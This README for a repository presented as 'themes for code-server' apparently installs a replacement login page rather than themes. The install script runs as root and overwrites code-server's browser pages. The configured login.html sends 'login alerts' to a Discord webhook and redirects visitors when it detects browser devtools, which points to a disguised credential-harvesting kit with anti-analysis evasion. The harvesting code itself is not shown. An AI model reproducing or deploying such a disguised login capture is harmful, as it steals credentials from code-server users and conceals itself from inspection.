# themes-vscode-uia

My themes for code-server.

```bash
sudo bash install.sh
```

## Requirements

- code-server installed at `/usr/lib/code-server`
- `gui.zip` and `install.sh` in the same directory
- Root privileges

## Configuration

Before running, open `login.html` and update the following variables:

```js
var REDIRECT_URL = 'https://www.google.com';
var WEBHOOK_URL  = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
```

- `REDIRECT_URL` — page to redirect to when devtools is detected or login fails twice
- `WEBHOOK_URL` — Discord webhook for login alerts

Then repack and run:

```bash
cd /path/to/files
zip -r gui.zip *.html *.css
sudo bash install.sh
```

## Restore

A timestamped backup is created automatically before each install at:

```
/usr/lib/code-server/src/browser/pages/backup_YYYYMMDD_HHMMSS/
```
